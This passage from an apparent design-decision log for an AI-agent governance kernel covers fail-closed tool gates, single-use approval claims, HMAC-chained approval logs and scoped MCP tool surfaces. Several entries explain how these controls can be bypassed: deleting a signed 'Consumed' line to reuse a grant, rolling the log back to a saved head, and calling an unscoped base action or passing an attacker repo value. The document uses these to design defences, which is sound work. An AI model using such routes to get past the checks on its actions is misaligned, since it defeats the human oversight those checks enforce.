+### D70 amendment (2026-08-15) — what the first candidate found, including about D70 itself
+
+`v0.4.2-rc.1` was cut for one reason: `softprops/action-gh-release` runs only on a
+tag, so D70's own residual said the only way to exercise it was a candidate. It was
+exercised — four platform builds, eight assets, and the GitHub release correctly
+marked as a prerelease. **The candidate then failed on `check-npm-pack.mjs`, one
+step before publishing.** Nothing reached npm.
+
+Two findings, and the second is the one worth keeping.
+
+1. **`npm pack --json` has two output shapes.** npm ≤ 11 returns an array of
+   entries; npm 12 returns an object keyed by package name. The release job runs
+   `npm install -g npm@latest` because trusted publishing needs ≥ 11.5.1, while
+   `release-dry-run` used whatever `setup-node` bundled. So the rehearsal ran npm 11
+   and the performance ran npm 12. **This is the third instance of one rule** —
+   after the shared assembly script and the action-pin parity guard — and the first
+   where the drifting component was a *tool* rather than a file in this repository.
+   The dry-run now upgrades npm the same way.
+
+2. **The guard could not tell "I cannot read the tool" from "the package is
+   broken."** Handed output it did not understand, it reported *every file missing
+   from every package* — a verdict about the artifact, when the truth was that it
+   had failed to inspect the artifact. **That is the exact confusion this project
+   published a post about, pointed the other way.** There, a failure to *record* a
+   decision was treated as permission to proceed; here, a failure to *reach* one was
+   treated as a defect. Both come from the same place: at the call site, "no answer"
+   and "a negative answer" have the same shape, and only one of them is about the
+   thing under test.
+
+   An unrecognised shape now throws, naming the npm version and the observed keys,
+   labelled as an instrument failure. **A guard that cannot say "I do not know" will
+   eventually say something false with confidence** — and in this case the false
+   thing was severe enough to block a release, which is the harmless direction. The
+   same bug in a guard that failed open would have published four empty packages.
+
+**Kept, deliberately: `v0.4.2-rc.1`'s tag and GitHub prerelease stay.** They are a
+valid, complete GitHub release that simply never reached npm, and re-pushing a
+published tag to tidy the history is a worse habit than an honest gap in the version
+sequence. `v0.3.1` was deleted and re-cut under a different rule — it was about to
+become `latest`.
+
+## D71 — An *engaged* host adapter fails closed on gate unavailability
+
+**Context.** The host-neutral Gate ABI (D24) leaves fail-open vs fail-closed to the
+adapter: "The adapter decides fail-open vs fail-closed on `≠0`." The two shipped
+adapters — the Claude Code `cc-hook` bootstrap shim and the OpenCode
+`tool.execute.before` plugin — both fail **open**: no binary / process error →
+allow, so a broken gate never bricks a session. That is the right default for a
+*bootstrap shim*: a shim that cannot even locate the kernel never governed the
+session, and bricking every tool call over a missing binary is worse than the
+ungoverned state that already existed.
+
+But the #54 governor-integrity benchmark review, and issue #55 explicitly, drew
+the line the blanket "log + allow" blurred: *"governed effects must not silently
+fail open."* Once an adapter has **engaged** the gate — the plugin is mounted and
+handling a call — a subsequent gate unavailability (missing binary, exit 1/2,
+unparseable stdout, unmappable verdict, unpersistable taint/usage sidecar) is no
+longer "never governed." Allowing the effect there silently drops governance that
+the deployment asked for.
+
+**Decision.** The DeepSeek Harness `tools/pre-execute` adapter (issue #55,
+`docs/demos/deepseek-harness/ai2rules-gate.ts`) **fails closed**: every path that
+cannot produce a trustworthy `ALLOW` returns `{kind:'deny'}`. The only sanctioned
+bypass is the explicit operator switch `AI2RULES_DISABLE=1` ("do not govern this
+session at all" — the *not-activated* case, structurally distinct from an
+engaged-but-broken gate). This is tested against the real dsh registry + the real
+`harness gate` binary (`ai2rules-gate.spec.ts`: `FAIL-CLOSED` binary-missing and
+exit-2 cases, plus the `BYPASS` case).
+
+**Alternatives.**
+- *Keep fail-open everywhere* (the shim default). Rejected for an engaged adapter:
+  it is the exact silent-fail-open #55 forbids, and it makes gate availability an
+  unmonitored dependency of the security property.
+- *Fail-open with a loud warning.* Rejected: a warning is not a control; the effect
+  still happens.
+- *Make the shim fail closed too.* Deliberately **not** done. The distinction is
+  the point: a bootstrap shim that cannot locate the kernel was never engaged, and
+  D37 keeps that layer fail-open on purpose (a missing hook file must not brick a
+  session). The fail-closed rule attaches to the *engaged* adapter, not the shim.
+
+**Consequence.** Adapters now come in two postures by role, and the ABI doc's
+"adapter decides" is refined to: *bootstrap shim → fail-open (not-yet-engaged);
+engaged adapter → fail-closed (governed effects)*. The `cc-hook`/OpenCode
+fail-open remains correct for their shim role; a future engaged in-process adapter
+should follow the fail-closed rule established here.
+
+## D72 — Discovery projection is a sibling wire ABI; the world owns existence and the host owns schema
+
+**Context.** `harness gate` can return `ABSENT` for an invocation, but issue #55
+requires DeepSeek Harness not to advertise ABSENT capabilities in the first place.
+Loading `WorldManifest` YAML in the TypeScript plugin would duplicate compilation
+and projection rules outside the kernel. Calling `gate` with invented empty
+arguments for every schema would confuse discovery with an effect proposal (and
+can classify commands, consult context, or charge an ALLOW). DeepSeek provides one
+authoritative `system-prompt/assemble` waterfall, but its registry owns the actual
+operational schemas.
+
+**Decision.** Add `harness project --world W`, a host-neutral single-shot wire
+operation. A host submits the exact schema array it is about to expose. The
+operation compiles `W` through the same loader and root normalization as `gate`,
+filters by `CompiledWorld::projected_actions()` and the declared source channel's
+compiled capability matrix, preserves surviving host schemas, and returns ABSENT
+names, the gate-compatible manifest identity, and SHA-256 of the exact visible
+schema array. Missing/undeclared source context and duplicate or malformed names
+are rejected.
+
+The DeepSeek plugin invokes `project` after downstream prompt-assembly listeners
+settle, so its returned assembly is authoritative. It re-runs on every assembly;
+invocation separately recompiles the current world through `gate`. A stale schema
+therefore never grants authority after revocation. Projector failure produces an
+empty surface and the already-engaged invocation adapter still denies on failure
+(D71).
+
+The world owns **whether a capability exists**; the host registry owns **how that
+capability is called**. The projector hashes the latter rather than parsing or
+regenerating it. DeepSeek Code Mode's generated SDK is unstructured prompt text;
+unless the reserved `run_code` transport is projected, the plugin removes the SDK
+and transport instruction instead of pretending it safely filtered prose.
+
+**Alternatives.**
+- *Parse the manifest in TypeScript.* Rejected: a second compiler/projection engine.
+- *Probe each tool through `gate`.* Rejected: fabricated calls are not discovery.
+- *Copy world descriptor schemas over dsh schemas.* Rejected: the demo world does
+  not own dsh's runtime contract, and silent schema skew would make visible calls
+  invalid at the host boundary.
+- *Cache projection until a file watcher fires.* Rejected: the next assembly is a
+  cheap, exact revocation boundary and does not depend on watcher reliability.
+
+**Consequence.** Discovery and invocation now share one compiled-world identity
+without moving policy into the plugin. The ABI is reusable by any non-Rust host
+with an authoritative schema seam; MCP's in-process projection remains free to
+re-issue world-owned descriptors because that gateway's manifest does own them.
+
+## D73 — ASK authorization is an exact, durable, single-use claim made before effect
+
+**Context.** The original `ApprovalToken` was durably signed and bound to action,
+arguments, manifest, descriptor, provenance, and effect mode, but resumption used
+the non-atomic sequence `is_granted → execute → mark_executed`. Two runtimes could
+therefore observe the same Approved token, both execute, and only then record
+completion. A crash in that window also resurrected the grant after restart. The
+artifact did not name a principal, resource, expiry, or consumption budget.
+
+**Decision.** The canonical artifact is now `AuthorizationInstance` (with
+`ApprovalToken` retained as a source-compatible alias). It binds a trusted-runtime
+principal, normalized action and complete JSON arguments, a stable resource label,
+world id + compiled-manifest epoch, effective-descriptor schema epoch, provenance,
+effect mode, exclusive expiry, and exactly one remaining use. A versioned canonical
+effect envelope is serialized deterministically and SHA-256 hashed.
+
+The signed append-only approval store serializes all mutations with a cross-process
+lock, reloads state under that lock, and appends `Consumed` before the external
+effect. Mismatches append signed `ConsumptionRejected` evidence with a specific
+reason. A crash after consumption burns the authorization: recovery is
+at-most-once and fail-closed, not an unsafe promise of exactly-once external I/O.
+After a successful claim the trusted orchestrator re-runs the pure kernel, so the
+artifact may satisfy `ASK` but cannot turn `DENY` or `ABSENT` into authority.
+
+The public Gate ABI remains decision-only. Its `approval_token` is still a
+correlation id (D41); a request cannot self-assert a grant. Store verification and
+consumption belong to a trusted runtime boundary with durable state.
+
+**Alternatives.** Keeping lookup and completion as separate operations was rejected
+because it leaves both concurrent replay and restart replay. Consuming after the
+effect was rejected for the same reason. Reserving and later rolling back on error
+was rejected because a crash could make rollback unknowable; burning the claim is
+the only deterministic fail-closed recovery without a transactional effect sink.
+Moving verification into `harness gate` was rejected because it would add I/O and
+host identity assumptions to the pure, reusable decision ABI.
+
+**Consequence.** One authorization admits at most one attempt at its exact effect.
+Substitution, cross-principal/session reuse, expiry, epoch drift, concurrent reuse,
+and restart replay fail closed with durable evidence. Callers needing retry must
+obtain a fresh human authorization; later staged-effect work can pair the same
+claim with a transactional sink rather than weakening this invariant.
+
+## D74 — External finality is a receipt state after independent staged commit
+
+**Context.** D73 closes authorization replay, but direct execution still collapses
+deterministic admission, authorization, and external finality into one call. Real
+payments, messages, broker orders, and cloud changes can time out after acceptance;
+neither `ALLOW` nor an executor error tells us whether the effect exists. Retrying
+that uncertainty can duplicate an irreversible action.
+
+**Decision.** Introduce a minimal `StagedEffect`: a sealed, durable, explicitly
+non-effective artifact binding proposal and admission identity, trusted principal,
+kernel-classified action and complete normalized arguments, effect/resource,
+world and schema epochs, `AuthorizationInstance`, effect mode, consequence class,
+actuator operation, idempotency key, and expiry.
+
+An independent commit coordinator reloads the signed artifact, revalidates its
+hash and current compiled epochs, reconstructs the canonical effect, validates
+consequence and actuator routing, and syncs `AttemptStarted` before it consumes
+authorization or invokes the privileged actuator. Every attempt produces a signed
+causal `ExecutionReceipt`. A started attempt without a terminal result, including
+a timeout after possible downstream acceptance, is `ambiguous` and never retried
+automatically. Duplicate terminal commits return a duplicate receipt and create at
+most one fake downstream effect across restart.
+
+Receipt outcomes (`committed`, `simulated`, `failed`, `rejected`, `duplicate`,
+`ambiguous`) are execution-finality states, **not new kernel verdicts**. SIMULATE
+uses the same commit validations and consumes its exact authorization but the
+actuator creates no external effect.
+
+**Alternatives.** Executing immediately after `ALLOW` was rejected for final
+effects because admission is not finality. Retrying after timeout was rejected
+because absence of a response is not evidence of absence. A distributed
+transaction framework was rejected as premature; the spike proves the artifact,
+reservation, actuator, and receipt seams first. Treating finality as new policy
+verdicts was rejected because it would mix two different state machines.
+
+**Consequence.** The prototype offers at-most-once/fail-closed finality with a
+fake independently-held actuator and durable causal evidence. Production use still
+requires protected actuator credentials and downstream idempotency. The API is not
+yet wired into the default agent loop; AI2-7 can now exercise it in TradingWorld.
+
+## D75 — Discovery projection lives beside `gate`, in `harness-preview`
+
+**Context.** D72 introduced discovery projection as the sibling wire ABI to `gate`:
+the world owns which names exist, the host owns the schema. The implementation,
+however, landed inside `cli-harness/src/project.rs` — a *wire skin* that also held
+the projection logic. `gate` had already been split the other way (pure function in
+`harness-preview`, stdin/stdout skin in `cli-harness`) precisely so that native,
+WASM, and in-process Rust hosts could not answer differently.
+
+The asymmetry became visible the moment a second caller appeared. The governance
+benchmark (E18) needs to ask the projection question from Rust; with the logic in a
+`[[bin]]`-only crate its only options were to spawn the CLI or to reimplement the
+filter — and an adapter that reimplements a governance filter is exactly what the
+one-kernel model exists to prevent.
+
+**Decision.** Move the pure projection into `harness_preview::project`, beside
+`gate` and `preview`. `cli-harness/src/project.rs` keeps the wire operation —
+argument parsing, manifest loading, stdin/stdout — and delegates. The three
+projection tests moved with the function.
+
+**Alternatives.** (a) Leave it and let the benchmark spawn `harness project` for
+every call: correct, but it makes an in-process Rust host a second-class citizen
+and forbids a linked/wire parity check. (b) Give `cli-harness` a `[lib]` target and
+depend on that: works, but it makes a terminal entrypoint into a library other
+crates link, and puts governance logic in the crate whose job is host plumbing.
+(c) Duplicate the filter in the benchmark: rejected outright — the drift would be
+undetectable and the benchmark would be measuring its own copy.
+
+**Consequence.** One projection implementation, reachable from the CLI, from
+in-process Rust, and (when exported) from WASM. E18 exercises both transports on
+every scenario and compares them step for step, so a future divergence is a test
+failure rather than a discovery. No wire behaviour changed: `harness project`
+answers byte-identically.
+
+## D76 — A governance benchmark publishes per-scenario evidence, and asserts its baseline still fails
+
+**Context.** E18 needed a shape for the Public MCP Governance Benchmark's
+executable seed. Governance benchmarks fail in two characteristic ways. They
+produce a **score**, which lets a target trade a line it holds against a line it
+loses. And their **baseline silently improves** — someone fixes the deliberately
+weak reference implementation, every run goes green, and the suite keeps reporting
+success while measuring nothing.
+
+**Decision.** Four rules, enforced structurally rather than by convention:
+
+1. **No aggregate score, anywhere.** Results are a scenario × target matrix of
+   PASS/FAIL plus the observed downstream effect count. Neither `results.json` nor
+   the generated report contains a total.
+2. **PASS requires an observed decision, an observed effect count, *and*
+   evidence the oracle actually reads.** The effect counter lives in the runner's
+   mock upstream, not in either target, and is read before and after every step,
+   so a target that answers `DENY` and calls the upstream anyway fails the second
+   half. Evidence is the third, and it is checked structurally on every step of
+   every run rather than left to each scenario: a refusal must name a rule, a
+   grant must say what it covers, a call presenting a handle must say which
+   identity it checked and — on a refusal — give a structured reason, and the
+   ledger's record must be the call the target was handed. The checked identities
+   are comparable across steps (`binding_distinguishes`), which is what turns
+   "an approval is bound to the exact effect" into a check: a target binding to a
+   tool name reports the same string for the approved call and for one with a
+   mutated argument, and fails on its own evidence before any effect is counted.
+
+   Without this the field was decorative. The first cut of the oracle read
+   verdicts, visibility, handles and effect counts and never opened `evidence`,
+   so a target could answer `{}` everywhere and pass all three scenarios — which
+   is not what issue #64 asks for. `a_correct_verdict_without_evidence_is_not_a_pass`
+   is the standing proof it now bites.
+3. **Neither side of the judgement knows the other.** Scenarios are data; the
+   oracle sees observations and expectations but no target identity; targets
+   implement three operations and never learn which case is running. "Expected to
+   fail here" is not expressible.
+4. **Acceptance is two-directional, and requires the contrast to have run.**
+   `--assert-contrast` (and the CI job) first insists on exactly one result for
+   every `scenario × {weak, ai2rules}` cell, then fails when ai2rules fails a
+   scenario *and* when the weak reference gateway passes one. Judging only the
+   runs that happen to exist let `--target ai2rules --assert-contrast` succeed
+   having never executed the baseline: an assertion about a comparison, passed
+   without the comparison. The check lives outside the oracle (`accept.rs`),
+   because it is the one layer that legitimately knows a benchmark has two
+   targets and that one of them is meant to fail.
+
+5. **The measured target is named for what it is.** ai2rules does not ship the
+   consume-then-invoke boundary as a command, so the benchmark supplies it; the
+   target is therefore `ai2rules-reference-host`, and its recorded identity
+   carries a `composition` block naming what ai2rules ships and what the
+   benchmark wired. A result proves that *composition* holds the line, not that a
+   shipped command does. Calling it `ai2rules` would have been the single most
+   load-bearing inaccuracy in the pack — precisely the overclaim the
+   no-aggregate-score rule exists to prevent, one level up.
+
+The full verdict vocabulary — `ABSENT`, `ALLOW`, `DENY`, `ASK`, `ERROR_CLOSED`,
+`ERROR_OPEN`, `UNKNOWN` — is preserved in the schema even where no scenario yet
+produces the last three, because a governor that *broke* must never be recorded as
+a governor that *decided*.
+
+**Alternatives.** (a) A single "governance score" per target: rejected as above; it
+is the format that made every prior comparison unciteable. (b) Encoding expected
+failures per target in the scenario files: rejected — the oracle would then be
+grading against its own answer key, and a real regression in ai2rules would be
+indistinguishable from an intended weak-baseline failure. (c) Letting each target
+report whether an effect occurred: rejected; that is the one fact a target under
+test must not be trusted for. (d) Skipping the weak baseline entirely and asserting
+only that ai2rules passes: rejected — without a target that fails, a green suite is
+evidence of nothing, which is precisely finding #18's lesson applied to evidence
+rather than to artifacts.
+
+**Consequence.** The seed pack is small (three scenarios) and honest about it: its
+README states what it does not claim, including that ai2rules does not yet ship the
+trusted authorization boundary as a command, so a host that omits ~40 lines of
+wiring gets the weak gateway's third defect from a correct kernel. Rules 2 and 4
+above were added in review (PR #69): both guarantees were true of the pack as
+written but were asserted in prose rather than enforced, which is the same defect
+class the benchmark measures — a control nothing checks is not a control. The committed
+`results/` directory is a build output in git — the shape that let the WASM artifact
+rot for seven weeks (finding #18) — so the `governance-bench` CI job regenerates it
+and fails on drift.
+
+## D77 — Tool outcomes re-enter the model loop through provider results; observers stay read-only
+
+**Context.** The orchestrator already constructed a neutral `ToolOutcome` and the
+Anthropic adapter already knew how to format it as a correlated `tool_result`, but
+the non-executed path assigned that value to `_feedback` and discarded it. Allowed
+execution results reached later turns indirectly as perceptions; `DENY`, `ABSENT`,
+and pending or rejected `ASK` decisions reached only the transcript. The first
+governed coding-workflow slice therefore used an observer callback plus shared
+memory to make a real refusal change the scripted model's next action. That proved
+the kernel decision but not the production feedback loop.
+
+**Decision.** The orchestrator retains the immediately preceding neutral
+`ToolOutcome`. `context::pack` consumes it on the next turn and uses the provider
+adapter to expose one correlated `tool_result` in `TurnContext`. Its content is
+stable structured JSON carrying action, canonical decision, rule, effect mode,
+display flow, and result; `is_error` distinguishes every non-executed or failed
+call. The slot is singular because `ModelTurn` currently permits one tool call per
+turn and `ModelClient` is stateful; it is a delta, not a duplicate conversation
+history. Observer callbacks remain presentation and telemetry only.
+
+**Alternatives.** Passing `TranscriptEntry` into the model was rejected because it
+is a display/audit shape and lacks the provider call identity. Letting the provider
+adapter import `KernelOutcome` was rejected because adapters translate formats and
+must not acquire policy dependencies. Keeping the observer-owned shared state was
+rejected because disabling observability would then change agent behavior. Packing
+the entire provider conversation into every `TurnContext` was deferred because the
+stateful model seam already owns that history; if a future `ModelTurn` supports
+parallel calls, the single result slot can become an ordered vector without
+changing the kernel contract.
+
+**Consequence.** `ALLOW`, `DENY`, `ABSENT`, and `ASK` now cross the same neutral
+outcome/provider-result seam and become direct input to the next model turn. The
+AI2-12 showcase replans with `observer: None`, and a regression model asserts call
+correlation plus the full verdict range. No kernel, Gate ABI, trace, policy, or
+executor semantics changed.
+
+## D78 — Signed logs are chained and head-anchored; a missing line is tampering, not history
+
+**Context.** Since finding #15 / D67 every line of the approval log (and, since D74,
+the staged-commit log) carries an HMAC, so a line cannot be forged or edited without
+the key. A per-line MAC says nothing about lines that are *not there*. Deleting the
+signed `Consumed` line from `approvals.jsonl` folded the authorization back to
+`Approved`, and the next `consume` succeeded — a single-use grant used twice, with no
+key and every remaining line verifying. The same holds for `AttemptStarted` /
+`AttemptFinished` in the commit log, which own an idempotency key. Found while
+checking an external write-up of the kernel; pinned by
+`deleting_the_consumed_line_does_not_revive_the_grant`, which failed on `41a4eda`.
+
+**Decision.** Both logs chain and anchor (`trace-store/src/chain.rs`):
+
+- line `n` carries `seq = n` and `prev` = the MAC of line `n-1` (`"genesis"` for 0);
+  its MAC covers `(seq, prev, event)` under a domain-separated prefix. Deleting,
+  reordering, or splicing a line breaks the chain (`out of chain`);
+- a chain cannot see its own tail being cut, so every append also rewrites
+  `<log>.head` — the last `(seq, mac)`, itself MACed — via temp file + rename (and a
+  best-effort directory sync). On load the log must *reach* the head and may run **at
+  most one line** past it — what a crash between append and head write leaves;
+  `open` re-anchors such a log under the lock, so the slack never accumulates;
+- every open store keeps a **high-water mark** — the furthest `(seq, mac)` it has
+  loaded or written — and refuses a later load that falls short of it;
+- a store with entries but no head is refused, not re-anchored: deleting the head is
+  the next step of cutting the tail. A fresh store writes a genesis head on open. A
+  log whose first line has no chain link is left to the line check, so a genuine
+  pre-D78 store is reported as old, not as tampered (the D73 distinction).
+
+**Alternatives.** A per-line counter without `prev` catches deletion but not splicing
+lines from another log under the same key. Chaining without a head misses tail
+truncation, which is exactly the `Consumed`-is-last case. Storing the head inside the
+key file couples two files with different lifecycles and permissions checks. Making
+`consume` idempotent-by-state elsewhere just moves the file.
+
+**Consequence.** Breaking for stores written before this change: an unchained line is
+refused with a message naming D78 ("delete the log, its key and its head file"), the
+same direction as D73's refusal of 0.4.1 records. The shipped CLI keeps its approval
+store in a per-run tempdir, so embedders holding a store across the upgrade are the
+ones affected. `open` now takes the store lock when it has to anchor (a fresh store
+or a crash-ahead log), so a stale `.lock` can make such an open fail after 5 s where
+it used to succeed. **Not covered**, and pinned by
+`known_limit_a_matching_old_snapshot_fools_a_new_process`: the log is append-only, so
+every older log is a prefix of the current one, and a copy of the *head alone*, saved
+between `Approved` and `Consumed`, lets someone cut the log back to it — against a
+process that has not already seen the longer chain. Rollback to a consistent earlier
+state needs a monotonic counter outside the attacker's reach; the store's placement
+outside the governed project (D57/D67) remains the primary defence. What D78 changes
+is the bar: from "delete a line" to "have saved the head at the right moment".
+
+## D79 — A scoped capability can rename and limit an MCP tool's arguments; the world can hide the tool it wraps
+
+**Date:** 2026-10-05. Phase 1 of **E13.4** (the MCP projection shim): manifest and kernel
+only. The gateway does not serve these tools yet; that is phase 2.
+
+**Context.** The goal is a governed stand-in for an MCP server: the operator picks which
+upstream tools exist, renames them, and limits what the model may pass — "only issues
+starting `PLAT-`", "only these three projects". Scoped capabilities already narrowed a base
+action (locked literals, stripped extras, invariant 12), and an MCP-backed action already
+lowered to `{server, tool, input}`. Three things were missing. A scoped capability could not
+rename an argument or limit its values. The base action it wrapped stayed on the surface
+beside it, so narrowing `getJiraIssue` into `get_platform_issue` left `getJiraIssue` callable.
+And literals were strings only, so `maxResults: 20` could not be pinned.
+
+**Decision.**
+
+- **`ArgSource::Input { as, one_of, prefix }`** beside `ActorInput`. `as` is the name the actor
+  supplies; the kernel reads the value under that name and passes it on under the base
+  action's name, both when validating against the base schema and when lowering to the
+  `ExecutionSpec`. `one_of` and `prefix` are checked on the value the actor sent, before
+  mapping; a value either rule refuses is `schema_violation` (DENY). Both apply when both are
+  set. A prefix only ever matches a string.
+- **The base name is not a back door.** A value sent under the base name of a renamed argument
+  is never read: it is stripped like any undeclared extra, so a call carrying only that name
+  is missing its required argument and is refused, never run without its limit.
+- **`projected: false` on a base action** keeps it in the ontology, so scoped capabilities can
+  name it, and out of the projection, so the model sees it as ABSENT. The name is the
+  compiled world's own (`CompiledWorld::is_projected`, invariant 2: known but not projected
+  is ABSENT). An earlier draft of this branch called it `exposed`; it was renamed before
+  release, so no manifest carries the old spelling. The same flag closes the bypass an
+  external review of the kernel found on its own: a scoped verb that pins `repo` was
+  pointless while its unscoped base action stayed callable with any `repo`.
+- **`ArgSource::Literal` holds any JSON value.** A string literal serializes exactly as before.
+- **`mcp_surface: { name, upstream }`** records the server name a gateway will announce and
+  the `McpServer` backing it fronts. Validation requires some base action to use that backing.
+- **`world_kernel::schema::model_facing_schema`** derives what the model is shown for a scoped
+  capability: actor-supplied arguments only, under their actor names, with `enum` for a list
+  and `pattern` (`^` plus the escaped prefix) for a prefix, closed with
+  `additionalProperties: false` because extras are stripped anyway. This is the advertisement;
+  the gate is the check. Per D51 the world owns this schema, not the upstream.
+- **L2 taint follows the rename.** An argument role is declared on the base name; the floor now
+  reads per-argument taint under the name the actor used.
+- **Every new field is skipped when it holds its default**, so no manifest written before this
+  changes its hash. The governance benchmark regenerates with no diff.
+
+**Alternatives.**
+
+- *A regex rule.* Rejected for now: it adds a dependency to the pure kernel and to the WASM
+  build, and a prefix covers the common case (issue keys, project keys). A list or prefix
+  cannot constrain free-text arguments such as JQL; templated arguments are a separate design.
+- *Put renames and limits in the gateway.* Rejected: policy in an adapter is the D34/D36/D48
+  drift, and other hosts would not get it. The gateway will forward the kernel's lowered
+  operation instead of the raw call.
+- *Derive the scoped descriptor's schema and validate against it.* Rejected: it would change
+  the descriptor hash of every existing scoped capability and replace strip-then-validate with
+  a closed check, changing behavior for the default world. Validation stays on base names.
+- *Hide a base action automatically when a scoped capability wraps it.* Rejected: an operator
+  may want both, and an implicit rule would surprise. The flag is explicit.
+- *Reuse `arg_constraints` for limits.* Rejected: those sit on the base action and apply to
+  every capability wrapping it; the limits here belong to one scoped capability.
+
+**Consequence.** A manifest can now express the stand-in fully, and the kernel enforces it.
+The committed WASM engine grows from 523 KB to 567 KB, measured against a rebuild of the
+previous commit with the same toolchain and `wasm-opt -Oz`. Until phase 2 the MCP gateway
+still lists tools by upstream name only, so scoped capabilities are not served over MCP yet.
+
+**Related:** D33, D45, D51, D68, D72; PLAN E13.4;
+`crates/world-kernel/tests/scoped_mcp_surface.rs`.
+
+### D79 amendment (2026-10-05) — phase 2: the gateway serves the surface (E13.4b)
+
+- **A declared `mcp_surface` switches the gateway to the backing as the source of truth.** An
+  action is served when its `McpServer` backing names the surface's upstream, under the
+  backing's tool name, so several scoped capabilities can wrap one upstream tool. The model is
+  offered each under its own name with `model_facing_schema`. A projected action backed by
+  another server is not served, even if the upstream advertises a tool of that name.
+- **Without a surface, nothing changes.** Every earlier world names upstream tools by action
+  name, and their backings were never read by the gateway — the mock demo worlds back
+  `jira_get_issue` with a tool called `get_issue`, which the upstream does not have. Making the
+  backing authoritative everywhere would have silently emptied those surfaces. The governance
+  benchmark regenerates with no diff.
+- **What is forwarded is the kernel's `ExecutionSpec`.** `harness_preview::gate_and_lower`
+  returns `gate`'s verdict unchanged plus, for an `ALLOW`, the lowered spec; the gateway sends
+  its `{tool, input}` upstream — renamed arguments mapped back, literals injected, extras
+  stripped. An allowed call that cannot be lowered, or is not served by this upstream, is
+  refused (`REFUSED (gateway)`, audited as `not_forwardable`). `gate`'s wire ABI is unchanged,
+  and `gate_and_lower` is native-only: the WASM build has nothing to execute.
+- **A refused forward ingests nothing and spends nothing.** The gate's post-call taint and
+  budget charge assume the call runs; when the gateway does not forward it, the session keeps
+  its pre-call taint and usage.
+- **Scoped capabilities may carry a `description`.** The gateway shows it instead of the
+  upstream's, which names the base action's arguments and is untrusted text (D51's residual).
+  Base actions still show the upstream's description.
+- **The gateway announces `mcp_surface.name`** as its `serverInfo.name`.
+- **Rejected:** *adding the lowered operation to `GateResponse`* — a wire ABI change for every
+  host when only this adapter executes; *re-running `decide` in the gateway to lower* — a second
+  verdict that could disagree with the first.
+
+### D79 amendment (2026-10-06) — phase 3: the authoring page (E13.4c)
+
+- **`harness mcp-author --world W -- <upstream>`** spawns the upstream once and serves a local
+  page: name the surface, tick the tools that exist, rename them, fix or limit each argument,
+  try calls, save `W`. `harness mcp-gateway --world W -- <upstream>` then serves it.
+- **The page builds the manifest as JSON; the server owns YAML.** It parses the JSON into the
+  real `WorldManifest`, renders it with `serde_yaml`, reloads the rendering and refuses to
+  continue unless it equals what was sent, then compiles it. Save refuses anything that does
+  not compile. There is no YAML writer and no governance logic in the page (D18).
+- **"Try it" is the gateway's own path** (`govern` → `forward_target`), so it shows the
+  verdict and the exact `{tool, arguments}` the gateway would send. It calls the upstream only
+  when asked to *send*, and the page confirms first: a send runs with the operator's upstream
+  credentials.
+- **The server is stricter than `harness serve`**, because this page can call a credentialed
+  upstream and write a file. It binds to 127.0.0.1, refuses a `Host` other than its own (DNS
+  rebinding), refuses a foreign `Origin`, and requires a per-run token in a custom header on
+  every POST; the token lives only in the served page. It writes only the `--world` path from
+  the command line. The upstream command is never written into the file: it can carry
+  credentials, and the file is meant to be committed. Everything the upstream sends is placed
+  in the page as text, never as HTML — tested with a hostile upstream.
+- **A loaded world keeps its own schemas.** When the upstream now describes a tool's arguments
+  differently, the saved schema stays and the page says so (D51). Parts of a world the page
+  cannot edit — another server's actions, a second scoped capability over one tool, context
+  references — are kept as written and named in a banner, never dropped.
+- **Shape of what the page writes.** A tool left as-is is a base action. A renamed, described
+  or limited tool becomes a hidden base action named `<tool>__upstream` plus one scoped
+  capability; the gateway finds the tool through the backing, so the base action's name is
+  free. A new world starts with one trusted channel, `Read`/`Mcp` capabilities, and the taint
+  floor on external and network effects.
+- **Rejected:** *generating YAML in the page* — a second serializer that could disagree with the
+  loader; *letting the page choose the save path* — a request could then write anywhere the
+  user can; *sending on every Try* — a write tool would run while the operator was still
+  designing it.
+
+### D79 amendment (2026-10-21) — worlds without a surface forward the lowering too
+
+- **The gap.** Phase 2 forwarded the kernel's lowering only when the world declared an
+  `mcp_surface`. Without one, the gateway sent `(action, arguments)` exactly as proposed. For
+  a scoped capability that meant its own name, which the upstream has never heard of, and the
+  caller's arguments: no literal was injected, and a locked argument the caller added
+  (`issue_key: SEC-9` beside a pinned `PLAT-1`) went through. An external review of the
+  kernel found the same shape independently. The same path also forwarded an unscoped call
+  under the action the kernel decided on, after `command_classes` (D36), not under the tool
+  name the client called.
+- **Decision.** Without a surface, an unscoped call is forwarded under the requested name
+  with its arguments, as before D79. A scoped capability goes to the upstream tool named
+  after its **base action**, which is how a surface-less world names upstream tools, with
+  the input of the kernel's `ExecutionSpec`. A call that cannot be lowered (a `ContextRef`
+  the gateway has no trusted source for) or does not lower to an MCP call is refused, and
+  audited as `not_forwardable`, like any other refused forward.
+- **Listing is unchanged.** Scoped capabilities in a surface-less world stay callable by name
+  and are not listed; listing them would change `tools/list` for existing worlds. Declare a
+  surface to have them offered.
+- **Rejected:** *refusing every scoped capability without a surface* — fail-closed as well,
+  but it makes scoped capabilities useless in exactly the worlds that already route by
+  action name, when the lowering that serves them already exists.
+
+## D80 — The gate returns the effective call; hosts execute that, not the proposal
+
+**Context.** The gate is decision-only (D24): on `ALLOW` the host runs its own tool. But the
+kernel decides on the *proposed* call, and a scoped capability runs with different
+arguments: locked and unknown actor arguments are stripped, renamed ones are mapped back to
+the base action's names (D79), and literals are injected (invariant 12). D79's phase 2 gave
+the in-process `mcp-gateway` that lowering through `gate_and_lower`, which returns the
+`ExecutionSpec`. A host that calls `harness gate` over the wire still got none of it: the
+gate would `ALLOW` `open_change_pr` with `repo: attacker/fork` beside a literal `repo`, and a
+host executing the proposal would send the attacker's value. An external review of the
+kernel found this independently (its G2). D79's phase 2 considered adding the lowered
+operation to `GateResponse` and rejected it as "a wire ABI change for every host when only
+this adapter executes". That premise does not hold for the port D24 exists to be: every
+out-of-process host executes, and only the wire can tell it what to run.
+
+**Decision.**
+
+- **`world_kernel::effective_call(world, intent) -> EffectiveCall`** is the single
+  lowering. It returns:
+  - the base action and its backing;
+  - the arguments after stripping, renaming and literal injection, under the base
+    action's names;
+  - `ContextRef` arguments, listed by key and not resolved, since runtime values are not
+    the pure kernel's to hold;
+  - the actor-supplied names the scoping dropped, including a renamed argument sent under
+    its base name.
+
+  `build_execution_spec` lowers through it and only resolves the context refs, so
+  `gate_and_lower`'s spec and the wire field cannot disagree.
+- **`GateResponse.effective`** carries it on `ALLOW` and `ASK`, so an approval prompt can
+  show what will actually run. It is a backward-compatible v1 field, skipped when absent.
+  (The WASM engine compiles the same `gate` but exports only `preview`, so the field is not
+  observable there yet.) It is not the `ExecutionSpec`: the spec also holds
